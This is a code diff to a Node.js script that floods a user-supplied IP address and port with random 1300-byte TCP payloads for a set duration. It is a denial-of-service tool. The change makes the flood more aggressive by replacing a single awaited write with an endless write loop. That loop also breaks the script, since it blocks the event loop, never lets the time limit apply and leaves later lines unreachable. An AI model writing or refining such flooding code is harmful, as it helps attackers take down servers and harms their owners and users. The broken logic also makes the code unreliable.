@@ -13,9 +13,9 @@ function sleep(ms) {
 
   const ip = process.argv[2];
   const port = parseInt(process.argv[3]);
-  const time = parseInt(process.argv[4]);
+  const timeInSeconds = parseInt(process.argv[4]); // Time in seconds
 
-  const endTime = Date.now() + time;
+  const endTime = Date.now() + (timeInSeconds * 1000); // Convert time to milliseconds
 
   while (Date.now() < endTime) {
     try {
@@ -30,20 +30,16 @@ function sleep(ms) {
       const data = Buffer.alloc(1300);
       crypto.randomFillSync(data);
 
-      // Send data
-      await new Promise((resolve, reject) => {
-        client.write(data, null, (err) => {
-          if (err) reject(err);
-          else resolve();
-        });
-      });
+      // Send data continuously without waiting for a response
+      while (true) {
+        client.write(data, null, () => {});
+      }
 
       console.log("Data sent successfully!");
-      client.destroy();
     } catch (err) {
       console.log(`Failed to connect or send data: ${err}`);
     }
 
-    await sleep(1000); // Wait for 5 seconds before sending the next packet
+    await sleep(5000); // Wait for 5 seconds before sending the next packet
   }
 })();
